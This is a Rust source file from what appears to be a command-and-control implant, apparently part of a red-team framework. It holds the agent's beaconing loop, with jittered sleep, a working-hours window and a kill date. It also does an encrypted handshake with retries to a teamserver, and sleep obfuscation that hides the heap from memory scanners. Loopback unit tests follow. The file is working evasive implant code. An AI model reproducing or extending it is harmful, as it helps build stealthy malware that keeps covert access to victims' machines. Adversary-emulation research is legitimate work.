//! Main agent run loop, sleep/jitter, and working-hours logic.

use std::time::Duration;

use time::{OffsetDateTime, Time};
use tracing::{info, warn};

use crate::sleep_obfuscate::blocking_sleep;

use super::PhantomAgent;
use crate::error::PhantomError;

/// Number of attempts for the init handshake before giving up.
const INIT_HANDSHAKE_RETRIES: u32 = 3;
/// Delay between init handshake retry attempts.
const INIT_HANDSHAKE_RETRY_DELAY: Duration = Duration::from_secs(2);

impl PhantomAgent {
    /// Run the main callback loop until exit conditions are met.
    pub async fn run(&mut self) -> Result<(), PhantomError> {
        if self.kill_date_elapsed() {
            warn!("phantom kill date already reached at startup; exiting");
            return Ok(());
        }

        self.wait_for_working_hours().await;

        if self.kill_date_elapsed() {
            warn!("phantom kill date reached during working-hours wait; exiting");
            return Ok(());
        }

        self.init_handshake_with_retry().await?;
        info!(agent_id = format_args!("0x{:08X}", self.agent_id), "phantom initialized");

        loop {
            if self.kill_date_elapsed() {
                warn!("phantom kill date reached; exiting");
                self.send_kill_date_callback().await?;
                break;
            }

            let delay = Duration::from_millis(self.compute_sleep_delay());
            let mode = self.config.sleep_mode;
            // Call blocking_sleep directly — do NOT use spawn_blocking here.
            //
            // mprotect_sleep marks the heap PROT_NONE for the entire sleep
            // window.  spawn_blocking would let the Tokio scheduler run other
            // tasks (timer callbacks, I/O events) on the main thread while the
            // blocking thread holds PROT_NONE, racing and causing SIGSEGV
            // (bead 1f7q1).  With current_thread runtime (set in main.rs),
            // calling blocking_sleep directly blocks the single executor thread
            // in nanosleep — no concurrent threads exist, no code can touch
            // heap memory during the PROT_NONE window.
            blocking_sleep(delay, mode);
            match self.checkin().await {
                Ok(true) => break,
                Ok(false) => {}
                Err(e) => {
                    warn!(
                        agent_id = format_args!("0x{:08X}", self.agent_id),
                        error = %e,
                        "checkin failed, will retry"
                    );
                }
            }
        }

        Ok(())
    }

    /// Perform the init handshake with up to [`INIT_HANDSHAKE_RETRIES`] attempts.
    ///
    /// Transport errors (connection refused, timeout, listener race at startup)
    /// are retried with a fixed backoff.  Non-transport errors (crypto, protocol,
    /// config) are returned immediately — retrying them would not help.
    async fn init_handshake_with_retry(&mut self) -> Result<(), PhantomError> {
        for attempt in 1..=INIT_HANDSHAKE_RETRIES {
            let result = if self.config.listener_pub_key.is_some() {
                self.ecdh_init_handshake().await
            } else {
                self.init_handshake().await
            };
            match result {
                Ok(()) => return Ok(()),
                Err(e @ PhantomError::Transport(_)) => {
                    warn!(
                        attempt,
                        max = INIT_HANDSHAKE_RETRIES,
                        error = %e,
                        "init handshake transport error; retrying"
                    );
                    if attempt < INIT_HANDSHAKE_RETRIES {
                        tokio::time::sleep(INIT_HANDSHAKE_RETRY_DELAY).await;
                    } else {
                        return Err(e);
                    }
                }
                Err(e) => return Err(e),
            }
        }
        // unreachable: INIT_HANDSHAKE_RETRIES > 0 so the final iteration always returns
        Err(PhantomError::Transport("init handshake failed after all retries".into()))
    }

    /// Block until the current time falls within the configured working-hours
    /// window (config or dynamic state).  Returns immediately when no working
    /// hours are configured.
    async fn wait_for_working_hours(&self) {
        let wh = self.state.working_hours().or(self.config.working_hours);
        let Some(wh) = wh else { return };
        let now = current_local_time();
        if is_within_working_hours_at(wh, now) {
            return;
        }
        let delay_ms = sleep_until_working_hours(wh, now);
        info!(delay_ms, "outside working hours; sleeping until window opens");
        let delay = Duration::from_millis(delay_ms);
        let mode = self.config.sleep_mode;
        // Same reasoning as the main loop: call directly to avoid concurrent
        // heap access during the mprotect PROT_NONE window (bead 1f7q1).
        blocking_sleep(delay, mode);
    }

    pub(super) fn compute_sleep_delay(&self) -> u64 {
        let base = u64::from(self.config.sleep_delay_ms);
        let now = current_local_time();
        let working_hours = self.state.working_hours().or(self.config.working_hours);
        if let Some(working_hours) = working_hours
            && !is_within_working_hours_at(working_hours, now)
            && base > 0
        {
            return sleep_until_working_hours(working_hours, now);
        }

        if self.config.sleep_jitter == 0 || base == 0 {
            return base;
        }

        let jitter_range = base * u64::from(self.config.sleep_jitter) / 100;
        let spread = jitter_range.saturating_mul(2);
        let jitter = rand::random::<u64>() % (spread.saturating_add(1));
        base.saturating_sub(jitter_range).saturating_add(jitter)
    }

    pub(super) fn kill_date_elapsed(&self) -> bool {
        let kill_date = self.state.kill_date().or(self.config.kill_date).filter(|&kd| kd > 0);
        match kill_date {
            Some(kill_date) => {
                let now = std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .map(|duration| i64::try_from(duration.as_secs()).unwrap_or(i64::MAX))
                    .unwrap_or_default();
                now >= kill_date
            }
            None => false,
        }
    }

    /// Send a `CommandKillDate` callback to the teamserver to notify it that
    /// the kill date has been reached, then flush any remaining callbacks.
    async fn send_kill_date_callback(&mut self) -> Result<(), PhantomError> {
        self.state.queue_kill_date_callback();
        self.flush_pending_callbacks().await
    }
}

pub(super) fn current_local_time() -> OffsetDateTime {
    OffsetDateTime::now_local().unwrap_or_else(|_| OffsetDateTime::now_utc())
}

pub(super) fn is_within_working_hours_at(working_hours: i32, now: OffsetDateTime) -> bool {
    let working_hours = working_hours as u32;
    if (working_hours >> 22) & 1 == 0 {
        return true;
    }

    let start = unpack_working_hours_time(working_hours, 17, 11);
    let end = unpack_working_hours_time(working_hours, 6, 0);
    let current = now.time();

    if current.hour() < start.hour() || current.hour() > end.hour() {
        return false;
    }
    if current.hour() == start.hour() && current.minute() < start.minute() {
        return false;
    }
    if current.hour() == end.hour() && current.minute() > end.minute() {
        return false;
    }

    true
}

pub(super) fn sleep_until_working_hours(working_hours: i32, now: OffsetDateTime) -> u64 {
    let working_hours = working_hours as u32;
    let start = unpack_working_hours_time(working_hours, 17, 11);
    let end = unpack_working_hours_time(working_hours, 6, 0);
    let current_minutes = u64::from(now.hour()) * 60 + u64::from(now.minute());
    let start_minutes = u64::from(start.hour()) * 60 + u64::from(start.minute());
    let end_minutes = u64::from(end.hour()) * 60 + u64::from(end.minute());

    let minutes_until_start = if current_minutes > end_minutes {
        ((24 * 60) - current_minutes) + start_minutes
    } else {
        start_minutes.saturating_sub(current_minutes)
    };
    minutes_until_start.saturating_mul(60_000)
}

fn unpack_working_hours_time(working_hours: u32, hour_shift: u32, minute_shift: u32) -> Time {
    let hour = ((working_hours >> hour_shift) & 0b01_1111) as u8;
    let minute = ((working_hours >> minute_shift) & 0b11_1111) as u8;
    Time::from_hms(hour.min(23), minute.min(59), 0).unwrap_or(Time::MIDNIGHT)
}

#[cfg(test)]
mod tests {
    use std::error::Error;
    use std::io::{Read, Write};
    use std::net::TcpListener;
    use std::sync::atomic::{AtomicUsize, Ordering};
    use std::sync::{Arc, mpsc};
    use std::thread;

    use red_cell_common::crypto::encrypt_agent_data;

    use super::super::PhantomAgent;
    use crate::config::PhantomConfig;
    use crate::error::PhantomError;

    fn read_http_request(
        stream: &mut std::net::TcpStream,
    ) -> Result<Vec<u8>, Box<dyn Error + Send + Sync>> {
        let mut request = Vec::new();
        let mut buffer = [0_u8; 4096];
        let mut header_end = None;
        let mut content_length = 0_usize;

        loop {
            let n = stream.read(&mut buffer)?;
            if n == 0 {
                break;
            }
            request.extend_from_slice(&buffer[..n]);

            if header_end.is_none() {
                header_end = request
                    .windows(4)
                    .position(|window| window == b"\r\n\r\n")
                    .map(|index| index + 4);
                if let Some(end) = header_end {
                    let headers = std::str::from_utf8(&request[..end])?;
                    content_length = headers
                        .lines()
                        .find_map(|line| {
                            let (name, value) = line.split_once(':')?;
                            name.eq_ignore_ascii_case("content-length").then_some(value.trim())
                        })
                        .unwrap_or("0")
                        .parse::<usize>()?;
                }
            }

            if let Some(end) = header_end
                && request.len() >= end + content_length
            {
                break;
            }
        }

        Ok(header_end.map_or_else(Vec::new, |end| request[end..].to_vec()))
    }

    fn write_http_response(
        stream: &mut std::net::TcpStream,
        body: &[u8],
    ) -> Result<(), Box<dyn Error + Send + Sync>> {
        stream.write_all(
            format!(
                "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n",
                body.len()
            )
            .as_bytes(),
        )?;
        stream.write_all(body)?;
        Ok(())
    }

    fn valid_ack(agent: &PhantomAgent) -> Result<Vec<u8>, Box<dyn Error + Send + Sync>> {
        Ok(encrypt_agent_data(
            &agent.session_crypto.key,
            &agent.session_crypto.iv,
            &agent.agent_id.to_le_bytes(),
        )?)
    }

    /// init_handshake_with_retry returns Ok(()) without sleeping when the first attempt succeeds.
    #[tokio::test(start_paused = true)]
    async fn retry_succeeds_on_first_attempt() -> Result<(), Box<dyn Error + Send + Sync>> {
        let listener = TcpListener::bind(("127.0.0.1", 0))?;
        let address = listener.local_addr()?;
        let (response_tx, response_rx) = mpsc::channel::<Vec<u8>>();

        let server = thread::spawn(move || -> Result<(), Box<dyn Error + Send + Sync>> {
            let (mut stream, _) = listener.accept()?;
            let _body = read_http_request(&mut stream)?;
            write_http_response(&mut stream, &response_rx.recv()?)?;
            Ok(())
        });

        let config = PhantomConfig {
            callback_url: format!("http://{address}/"),
            sleep_delay_ms: 0,
            ..PhantomConfig::default()
        };
        let mut agent = PhantomAgent::new(config)?;
        response_tx.send(valid_ack(&agent)?)?;

        agent.init_handshake_with_retry().await?;

        assert_eq!(agent.ctr_offset, 1);
        server.join().map_err(|_| "server thread panicked")??;
        Ok(())
    }

    /// A Transport error on attempt 1 is retried; success on attempt 2 returns Ok(()).
    #[tokio::test(start_paused = true)]
    async fn retry_succeeds_after_one_transport_failure() -> Result<(), Box<dyn Error + Send + Sync>>
    {
        let listener = TcpListener::bind(("127.0.0.1", 0))?;
        let address = listener.local_addr()?;
        let (response_tx, response_rx) = mpsc::channel::<Vec<u8>>();

        let server = thread::spawn(move || -> Result<(), Box<dyn Error + Send + Sync>> {
            // Accept and immediately drop the first connection → client gets connection-reset.
            let _ = listener.accept()?;
            // Accept the second connection and serve a valid acknowledgement.
            let (mut stream, _) = listener.accept()?;
            let _body = read_http_request(&mut stream)?;
            write_http_response(&mut stream, &response_rx.recv()?)?;
            Ok(())
        });

        let config = PhantomConfig {
            callback_url: format!("http://{address}/"),
            sleep_delay_ms: 0,
            ..PhantomConfig::default()
        };
        let mut agent = PhantomAgent::new(config)?;
        response_tx.send(valid_ack(&agent)?)?;

        // The 2-second retry delay is instant because time is paused.
        agent.init_handshake_with_retry().await?;

        assert_eq!(agent.ctr_offset, 1);
        server.join().map_err(|_| "server thread panicked")??;
        Ok(())
    }

    /// Transport errors on all 3 attempts exhaust the retry budget and return Err(Transport).
    #[tokio::test(start_paused = true)]
    async fn retry_exhausts_all_attempts_with_transport_error()
    -> Result<(), Box<dyn Error + Send + Sync>> {
        // Bind a port to get an ephemeral address, then drop the listener so the port
        // is closed before the agent connects → every attempt gets "connection refused".
        let address = {
            let listener = TcpListener::bind(("127.0.0.1", 0))?;
            listener.local_addr()?
        };

        let config = PhantomConfig {
            callback_url: format!("http://{address}/"),
            sleep_delay_ms: 0,
            ..PhantomConfig::default()
        };
        let mut agent = PhantomAgent::new(config)?;

        let result = agent.init_handshake_with_retry().await;
        assert!(
            matches!(result, Err(PhantomError::Transport(_))),
            "expected Transport error after exhausting retries, got {result:?}"
        );
        Ok(())
    }

    /// A non-Transport error (e.g. crypto mismatch) is propagated immediately without retry.
    #[tokio::test(start_paused = true)]
    async fn retry_does_not_retry_non_transport_error() -> Result<(), Box<dyn Error + Send + Sync>>
    {
        let connection_count = Arc::new(AtomicUsize::new(0));
        let counter_clone = Arc::clone(&connection_count);

        let listener = TcpListener::bind(("127.0.0.1", 0))?;
        let address = listener.local_addr()?;

        let server = thread::spawn(move || -> Result<(), Box<dyn Error + Send + Sync>> {
            let (mut stream, _) = listener.accept()?;
            counter_clone.fetch_add(1, Ordering::SeqCst);
            let _body = read_http_request(&mut stream)?;
            // Garbage body → parse_init_ack returns Crypto or InvalidResponse, not Transport.
            write_http_response(&mut stream, b"not-a-valid-ack")?;
            Ok(())
        });

        let config = PhantomConfig {
            callback_url: format!("http://{address}/"),
            sleep_delay_ms: 0,
            ..PhantomConfig::default()
        };
        let mut agent = PhantomAgent::new(config)?;

        let result = agent.init_handshake_with_retry().await;

        assert!(result.is_err(), "expected an error, got Ok");
        assert!(
            !matches!(result, Err(PhantomError::Transport(_))),
            "non-Transport errors must not be retried; got Transport"
        );
        // Exactly one connection → no retry happened.
        assert_eq!(connection_count.load(Ordering::SeqCst), 1);

        server.join().map_err(|_| "server thread panicked")??;
        Ok(())
    }
}
